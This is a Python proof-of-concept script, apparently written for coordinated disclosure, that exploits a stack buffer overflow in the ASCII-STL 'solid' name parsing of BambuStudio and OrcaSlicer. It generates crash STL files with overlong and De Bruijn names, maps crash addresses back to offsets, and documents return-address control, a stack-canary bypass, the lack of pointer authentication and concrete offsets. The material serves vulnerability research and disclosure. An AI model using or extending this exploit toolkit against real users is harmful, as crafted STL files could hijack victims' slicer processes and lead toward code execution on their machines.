#!/usr/bin/env python3
# =============================================================================
# f1a_solid_overflow_poc.py
#
# Focused proof-of-concept + offset tooling for finding F1a: the ASCII-STL
# "solid" line stack buffer overflow in BambuStudio and OrcaSlicer. Standard
# library only. Generates crash reproducers (not a weaponized exploit) for
# coordinated disclosure. Run against your own installed software on your own
# machine.
#
# ---------------------------------------------------------------------------
# THE BUG (F1a)
# ---------------------------------------------------------------------------
# In the vendored ADMesh loader, the ASCII branch reads the model's "solid"
# name into a fixed 256-byte stack buffer with NO field-width limit:
#
#     BambuStudio  src/admesh/stlinit.cpp:168-169
#         char solid_content[256];
#         int  res_solid = fscanf(fp, " solid %[^\n]", solid_content);
#     OrcaSlicer   deps_src/admesh/stlinit.cpp:164-165   (buffer named solid_name)
#
# An ASCII STL's first line is  "solid <name>\n". The %[^\n] conversion copies
# <name> until newline into the 256-byte stack buffer; a <name> longer than 255
# bytes overruns the buffer, the adjacent std::string locals, and the saved
# return address. (Slic3r/PrusaSlicer/ADMesh proper are safe: they use the
# assignment-suppressed `%*[^\n]`, which parses and discards with no buffer.)
#
# ---------------------------------------------------------------------------
# WHY IT IS EXPLOITABLE-CLASS (not just a crash)
# ---------------------------------------------------------------------------
# Confirmed live on macOS 26.5.2 / Apple Silicon (2026-09-07):
#   * BambuStudio 02.08.02.61 and OrcaSlicer 2.4.2 both crash with the SAVED
#     RETURN ADDRESS overwritten by attacker bytes (0x414141414141) -> control
#     of the instruction pointer.
#   * The stack canary is BYPASSED: the overflow smashes std::string locals
#     (model_id / country_code) that are dereferenced mid-function when passed
#     to the progress callback, so the process faults on a poisoned pointer
#     before the function epilogue's canary check ever runs.
#   * The binaries are arm64 (NOT arm64e) -> no Pointer Authentication on return
#     addresses, so a controlled return slot is directly usable.
#   * Reached by opening/dragging any .stl (Model.cpp -> load_stl -> stl_open).
# Using a De Bruijn "solid" name, the controlled slots decode to fixed offsets
# (BambuStudio 02.08.02.61 build: return address @ 368, a second dereferenced
# pointer @ 672).
#
# Remaining barrier to code execution is ASLR (PIE); the app further weakens its
# own hardened runtime via allow-unsigned-executable-memory + disable-library-
# validation entitlements. This tool stops at proving control of the faulting
# address; it does not build an ASLR-defeat or a payload.
#
# ---------------------------------------------------------------------------
# USAGE
# ---------------------------------------------------------------------------
#   python3 f1a_solid_overflow_poc.py plain   [--n 20000] [--outdir DIR]
#       Reliable overflow: solid name = N 'A's. Return address decodes to 0x41..
#   python3 f1a_solid_overflow_poc.py cyclic  [--n 1200]  [--outdir DIR]
#       Offset-finder: solid name = an N-byte De Bruijn pattern (saved to
#       <outdir>/F1a_cyclic.pattern alongside the .stl).
#   python3 f1a_solid_overflow_poc.py offset 0x<faulting_address> [--outdir DIR]
#       Decode a crash faulting/return address back to the pattern byte offset.
#
# Reproduce, then read the crash report:
#   open -a BambuStudio poc_live/F1a_solid_overflow.stl
#   open -a OrcaSlicer  poc_live/F1a_solid_overflow.stl
#   ls -t ~/Library/Logs/DiagnosticReports/{BambuStudio,OrcaSlicer}-*.ips | head -1
#
# Standalone study aid (the bug in ~10 lines of C) lives in poc/F1_essence.c.
# =============================================================================

from __future__ import annotations
import argparse
import os

# One throwaway facet so the file parses as a plausible STL after the solid line.
_ONE_FACET = ("facet normal 0 0 0\n outer loop\n"
              "  vertex 0 0 0\n  vertex 1 0 0\n  vertex 0 1 0\n"
              " endloop\nendfacet\n")


def write_solid_overflow_stl(path: str, solid_name: str) -> None:
    """Write an ASCII STL whose `solid <name>` line carries `solid_name`.
    `solid_name` longer than 255 bytes is what overruns solid_content[256]."""
    with open(path, "w") as f:
        f.write("solid " + solid_name + "\n")   # <-- the attack surface
        f.write(_ONE_FACET)
        f.write("endsolid\n")


def de_bruijn(n: int = 4,
              alphabet: str = ("abcdefghijklmnopqrstuvwxyz"
                               "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),
              length: int | None = None) -> str:
    """De Bruijn cyclic sequence: every n-length window is unique, so any n bytes
    recovered from a crash address map to exactly one offset in the overflow."""
    k = len(alphabet)
    a = [0] * k * n
    seq: list[int] = []

    def db(t: int, p: int) -> None:
        if t > n:
            if n % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    s = "".join(alphabet[i] for i in seq)
    if length:
        while len(s) < length:
            s += s
        s = s[:length]
    return s


def find_offset(pattern: str, value_hex: str):
    """Map a crash faulting/return address back to the byte offset in `pattern`
    at which those bytes sit -- i.e. the distance from the start of the solid name
    to the controlled slot (return address or dereferenced pointer). Tries 8- and
    4-byte windows in little- and big-endian."""
    v = int(value_hex, 16)
    for blen in (8, 4):
        if v >= (1 << (blen * 8)):
            continue
        for endian in ("little", "big"):
            try:
                sub = v.to_bytes(blen, endian).decode("latin1")
            except Exception:
                continue
            idx = pattern.find(sub)
            if idx >= 0:
                return {"offset": idx, "width": blen, "endian": endian, "bytes": sub}
    return None


def gen_plain(outdir: str, n: int = 20000) -> str:
    """Reliable overflow: solid name = `n` 'A's -> saved return address = 0x41.."""
    path = os.path.join(outdir, "F1a_solid_overflow.stl")
    write_solid_overflow_stl(path, "A" * n)
    return path


def gen_cyclic(outdir: str, n: int = 1200) -> str:
    """Offset-finder: solid name = an `n`-byte De Bruijn pattern (also saved raw
    to F1a_cyclic.pattern so `offset` can decode a later crash address)."""
    pat = de_bruijn(length=n)
    stl = os.path.join(outdir, "F1a_cyclic.stl")
    write_solid_overflow_stl(stl, pat)
    with open(os.path.join(outdir, "F1a_cyclic.pattern"), "w") as f:
        f.write(pat)
    return stl


def main(argv=None) -> None:
    ap = argparse.ArgumentParser(description="F1a: ASCII-STL 'solid' line overflow PoC + offset tool")
    ap.add_argument("cmd", choices=["plain", "cyclic", "offset"])
    ap.add_argument("value", nargs="?", help="for 'offset': the crash faulting address, e.g. 0x6361615663616155")
    ap.add_argument("--outdir", default="poc_live")
    ap.add_argument("--n", type=int, help="plain: number of 'A's; cyclic: pattern length (default 20000 / 1200)")
    a = ap.parse_args(argv)

    if a.cmd == "offset":
        if not a.value:
            ap.error("offset requires a hex faulting address")
        pat_path = os.path.join(a.outdir, "F1a_cyclic.pattern")
        if not os.path.exists(pat_path):
            ap.error(f"{pat_path} not found -- run 'cyclic' first")
        r = find_offset(open(pat_path).read(), a.value)
        print(r if r else "no match (bytes not in pattern -- possibly a mangled/partial pointer)")
        return

    os.makedirs(a.outdir, exist_ok=True)
    path = gen_plain(a.outdir, a.n or 20000) if a.cmd == "plain" else gen_cyclic(a.outdir, a.n or 1200)
    with open(path) as f:
        first = f.readline().rstrip("\n")
    print(f"wrote {path}  (solid line = {len(first) - 6} bytes after 'solid ')")


if __name__ == "__main__":
    main()
